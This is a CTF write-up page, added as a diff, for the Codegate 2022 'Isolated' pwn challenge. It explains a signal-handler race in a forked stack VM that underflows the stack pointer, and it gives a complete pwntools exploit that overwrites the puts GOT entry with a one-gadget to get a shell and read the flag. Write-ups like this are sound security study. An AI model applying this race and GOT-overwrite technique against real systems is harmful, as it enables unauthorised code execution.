@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Isolated | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Isolated" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/Codegate-2022-quals/pwn/isolated.html" />
+<meta property="og:url" content="https://org.anize.rs/Codegate-2022-quals/pwn/isolated.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Isolated" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"Isolated","url":"https://org.anize.rs/Codegate-2022-quals/pwn/isolated.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="isolated">Isolated</h1>
+
+<p><strong>Author</strong>: pql</p>
+
+<p><strong>Tags:</strong> pwn</p>
+
+<p><strong>Points:</strong> 884 (19 solves)</p>
+
+<p><strong>Description:</strong></p>
+
+<blockquote>
+  <p>Simple VM, But isloated.</p>
+</blockquote>
+
+<p>We’re provided a small executable that <code class="language-plaintext highlighter-rouge">fork()</code>s and sets up a server-client relation, where the parent process acts as server that receives instructions from the client. We can provided <code class="language-plaintext highlighter-rouge">0x300</code> bytes of custom instructions that will be ran on the simple stack architecture VM that the server and client define together. The client and server share a memory mapping (with <code class="language-plaintext highlighter-rouge">MAP_SHARED</code>) that they will use for communication of routine arguments and results.</p>
+
+<h4 id="the-architecture">The architecture</h4>
+
+<p>The server defines a few signal handlers that respectively push, pop and clean the stack, and one that enables “logging mode”. The logging mode makes all other signal handlers print some debug information before executing. The stack has defined bounds at <code class="language-plaintext highlighter-rouge">stack_ptr = 0</code> and <code class="language-plaintext highlighter-rouge">stack_ptr = 768</code>, after which <code class="language-plaintext highlighter-rouge">pop</code> and <code class="language-plaintext highlighter-rouge">push</code> respectively will fail.</p>
+
+<p>The client is tasked with decoding the provided instructions, and then sends a signal to the parent process to execute a signal handler. The signal handler then executes, and a variable in the shared memory is set to indicate the result. It should be noted that the following seccomp policy is applied to the child:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x15 0x00 0x01 0x0000003e  if (A != kill) goto 0005
+ 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0005: 0x06 0x00 0x00 0x00000001  return KILL
+</code></pre></div></div>
+
+<p>This hints us towards that fact that we should be exploiting the parent process.</p>
+
+<p>There’s a few defined instructions:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;0&gt; &lt;xx xx xx xx&gt; pushes xx xx xx xx
+&lt;1&gt; pops (into the void)
+
+The next instructions can take either a 4-byte immediate or a value popped from the stack. 
+A pop is denoted by &lt;0x55&gt; and an immediate is denoted by &lt;0x66&gt; &lt;xx xx xx xx&gt;. We'll call this a &lt;imm/pop&gt;
+
+&lt;2&gt; &lt;imm/pop&gt; &lt;imm/pop&gt; adds two operands and pushes the result
+&lt;3&gt; &lt;imm/pop&gt; &lt;imm/pop&gt; subtracts two operands and pushes the result
+&lt;4&gt; &lt;imm/pop&gt; &lt;imm/pop&gt; multiplies two operands and pushes the result
+&lt;5&gt; &lt;imm/pop&gt; &lt;imm/pop&gt; divides two operands and pushes the result
+&lt;6&gt; &lt;imm/pop&gt; &lt;imm/pop&gt; compares if the two operands are equal and sets a flag if this is the case.
+
+&lt;7&gt; &lt;imm/pop&gt; jumps to the operand
+&lt;8&gt; &lt;imm/pop&gt; jumps to the operand IF the flag is set (see 6)
+&lt;9&gt; cleans the stack
+&lt;10&gt; &lt;imm/pop&gt; sets log mode to the operand (any non-zero value is on)
+
+Anything else will kill parent and child immediately.
+</code></pre></div></div>
+
+<h4 id="the-bug">The bug</h4>
+
+<p>All pops and pushes are <em>blocking</em> (they wait for the result), except the normal push and pop instructions &lt;0&gt; and &lt;1&gt;. Since these instructions don’t wait for the result, they can cause a desynchronization of state. We can trigger a signal handler in the parent whilst another signal handler is already running, which is effectively a kind of concurrence on a single execution core. We can use the resulting race condition to circumvent the bound check for <code class="language-plaintext highlighter-rouge">pop</code> and <code class="language-plaintext highlighter-rouge">push</code> in the parent process.</p>
+
+<p>The resulting exploit underflows the stack pointer to -1, at which point we can navigate the stack pointer to a GOT entry (I picked <code class="language-plaintext highlighter-rouge">puts</code>) and use the add instruction (<code class="language-plaintext highlighter-rouge">&lt;2&gt;</code>) to add a constant offset to a one shot gadget to its lower four bytes.</p>
+
+<p>Winning the race was mostly a bunch of trial and error, I combined <code class="language-plaintext highlighter-rouge">pop</code> with <code class="language-plaintext highlighter-rouge">clean_stack</code>, so the stack pointer will be zeroed but the <code class="language-plaintext highlighter-rouge">pop</code> routine will still decrement it. On local docker, i was able to win the race about 25% of the time, but on remote it is less than 1%.</p>
+
+<h4 id="the-exploit">The exploit</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">pwnlib.util.proc</span> <span class="kn">import</span> <span class="n">descendants</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">"terminator"</span><span class="p">,</span> <span class="s">"-e"</span><span class="p">]</span>
+
+<span class="n">BINARY_NAME</span> <span class="o">=</span> <span class="s">"./isolated"</span>
+<span class="n">LIBC_NAME</span> <span class="o">=</span> <span class="s">"./libc.so"</span>
+<span class="n">REMOTE</span> <span class="o">=</span> <span class="p">(</span><span class="s">"3.38.234.54"</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
+<span class="n">DOCKER_REMOTE</span> <span class="o">=</span> <span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">BINARY_NAME</span>
+<span class="n">binary</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_NAME</span><span class="p">)</span>
+
+<span class="n">EXEC_STR</span> <span class="o">=</span> <span class="p">[</span><span class="n">binary</span><span class="p">.</span><span class="n">path</span><span class="p">]</span>
+
+<span class="n">PIE_ENABLED</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">pie</span>
+
+<span class="n">BREAKPOINTS</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">args</span><span class="p">.</span><span class="n">BREAK</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)]</span> <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">BREAK</span> <span class="k">else</span> <span class="p">[]</span>
+
+<span class="n">gdbscript_break</span> <span class="o">=</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="s">'pie '</span> <span class="k">if</span> <span class="n">PIE_ENABLED</span> <span class="k">else</span> <span class="s">''</span><span class="si">}</span><span class="s">break *</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">BREAKPOINTS</span><span class="p">])</span>
+
+<span class="n">gdbscript</span> <span class="o">=</span> \
+        <span class="s">"""
+        set follow-fork-mode child
+        """</span>
+
+
+<span class="k">def</span> <span class="nf">handle</span><span class="p">():</span>
+    
+    <span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span><span class="p">}</span>
+    
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="o">*</span><span class="n">REMOTE</span><span class="p">)</span>
+    
+    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">EXEC_STR</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>        
+        <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">EXEC_STR</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript_break</span> <span class="o">+</span> <span class="n">gdbscript</span><span class="p">)</span>
+    
+    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">DOCKER</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="o">*</span><span class="n">DOCKER_REMOTE</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">error</span><span class="p">(</span><span class="s">"No argument supplied.</span><span class="se">\n</span><span class="s">Usage: python exploit.py (REMOTE|LOCAL) [GDB] [STRACE]"</span><span class="p">)</span> 
+    
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">STRACE</span><span class="p">:</span>
+        <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="o">*</span><span class="n">context</span><span class="p">.</span><span class="n">terminal</span><span class="p">,</span> <span class="sa">f</span><span class="s">"strace -p </span><span class="si">{</span><span class="n">p</span><span class="p">.</span><span class="n">pid</span><span class="si">}</span><span class="s">; cat"</span><span class="p">])</span>
+        <span class="nb">input</span><span class="p">(</span><span class="s">"Waiting for enter..."</span><span class="p">)</span>
+    
+    <span class="k">return</span> <span class="n">p</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">l</span> <span class="o">=</span> <span class="n">handle</span><span class="p">()</span>
+    <span class="c1">#print(l.pid)
+</span>    <span class="s">"""
+    &lt;0&gt; &lt;xx xx xx xx&gt; pushes xx xx xx xx
+    &lt;1&gt; pops (into the void)
+
+    The next instructions can take either a 4-byte immediate or a value popped from the stack. 
+    A pop is denoted by &lt;0x55&gt; and an immediate is denoted by &lt;0x66&gt; &lt;xx xx xx xx&gt;. We'll call this a &lt;imm/pop&gt;
+
+    &lt;2&gt; &lt;imm/pop&gt; &lt;imm/pop&gt; adds two operands and pushes the result
+    &lt;3&gt; &lt;imm/pop&gt; &lt;imm/pop&gt; subtracts two operands and pushes the result
+    &lt;4&gt; &lt;imm/pop&gt; &lt;imm/pop&gt; multiplies two operands and pushes the result
+    &lt;5&gt; &lt;imm/pop&gt; &lt;imm/pop&gt; divides two operands and pushes the result
+    &lt;6&gt; &lt;imm/pop&gt; &lt;imm/pop&gt; compares if the two operands are equal and sets a flag if this is the case.
+
+    &lt;7&gt; &lt;imm/pop&gt; jumps to the operand
+    &lt;8&gt; &lt;imm/pop&gt; jumps to the operand IF the flag is set (see 6)
+    &lt;9&gt; cleans the stack
+    &lt;10&gt; &lt;imm/pop&gt; sets log mode to the operand (any non-zero value is on)
+
+    anything else kills the parent immediately
+    """</span>
+
+    <span class="n">ONE_GADGETS</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="mh">0x4f432</span><span class="p">,</span>
+        <span class="mh">0x10a41c</span>
+    <span class="p">]</span>
+
+    <span class="n">rel_og_offsets</span> <span class="o">=</span> <span class="p">[</span><span class="n">og</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span> <span class="k">for</span> <span class="n">og</span> <span class="ow">in</span> <span class="n">ONE_GADGETS</span><span class="p">];</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">rel_og_offsets</span><span class="p">)</span>
+
+    <span class="n">dbg</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">[</span><span class="mi">10</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="o">*</span><span class="n">p32</span><span class="p">(</span><span class="n">x</span><span class="p">)]</span>
+    <span class="n">pop</span>  <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">cmp_pop_blocking</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">y</span><span class="p">:</span> <span class="p">[</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="o">*</span><span class="n">p32</span><span class="p">(</span><span class="n">y</span><span class="p">)]</span> <span class="c1"># compares if popped value equal to 0 and sets flag
+</span>    <span class="n">push_blocking</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="o">*</span><span class="n">p32</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="mh">0x66</span><span class="p">,</span> <span class="o">*</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)]</span> <span class="c1"># adds
+</span>    <span class="n">jmp</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">[</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="o">*</span><span class="n">p32</span><span class="p">(</span><span class="n">x</span><span class="p">)]</span>
+    <span class="n">clean_stack</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="p">[</span><span class="mi">9</span><span class="p">]</span>
+    <span class="n">cmp_imm_imm</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="p">[</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="o">*</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x41414141</span><span class="p">),</span> <span class="mh">0x66</span><span class="p">,</span> <span class="o">*</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x41414142</span><span class="p">)]</span>
+    <span class="n">add_constant</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="o">*</span><span class="n">p32</span><span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">),</span> <span class="mh">0x55</span><span class="p">]</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="o">*</span><span class="n">dbg</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)]</span> <span class="c1"># 6
+</span>    
+    <span class="n">start</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x203100</span> <span class="o">-</span> <span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span> <span class="o">//</span> <span class="mi">4</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+
+    <span class="n">payload</span><span class="p">.</span><span class="n">extend</span><span class="p">([</span>
+        <span class="o">*</span><span class="n">push_blocking</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+        <span class="o">*</span><span class="p">[</span><span class="o">*</span><span class="n">cmp_imm_imm</span><span class="p">()</span> <span class="o">*</span> <span class="mi">10</span><span class="p">],</span>
+        <span class="o">*</span><span class="n">pop</span><span class="p">(),</span> <span class="o">*</span><span class="n">pop</span><span class="p">(),</span>
+        <span class="o">*</span><span class="n">clean_stack</span><span class="p">(),</span>
+        <span class="o">*</span><span class="p">[</span><span class="o">*</span><span class="n">cmp_imm_imm</span><span class="p">()</span> <span class="o">*</span> <span class="mi">10</span><span class="p">],</span>
+        <span class="o">*</span><span class="n">cmp_pop_blocking</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">),</span>
+        <span class="o">*</span><span class="n">dbg</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+        <span class="o">*</span><span class="p">[</span><span class="o">*</span><span class="n">cmp_imm_imm</span><span class="p">()</span> <span class="o">*</span> <span class="mi">5</span><span class="p">],</span>
+        <span class="o">*</span><span class="p">[</span><span class="o">*</span><span class="n">push_blocking</span><span class="p">(</span><span class="o">-</span><span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">],</span>
+        <span class="o">*</span><span class="n">add_constant</span><span class="p">(</span><span class="n">rel_og_offsets</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span>
+        <span class="o">*</span><span class="n">dbg</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="c1"># get shell!
+</span>    <span class="p">])</span>
+
+
+    <span class="n">payload</span><span class="p">.</span><span class="n">extend</span><span class="p">(</span><span class="n">jmp</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
+    
+    <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="c1">#print(hexdump(payload))
+</span>    <span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"opcodes &gt;"</span><span class="p">)</span>
+
+    <span class="n">l</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"puts @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+     
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"cat flag"</span><span class="p">)</span>
+    
+    <span class="k">assert</span> <span class="sa">b</span><span class="s">"timeout"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">l</span><span class="p">.</span><span class="n">stream</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
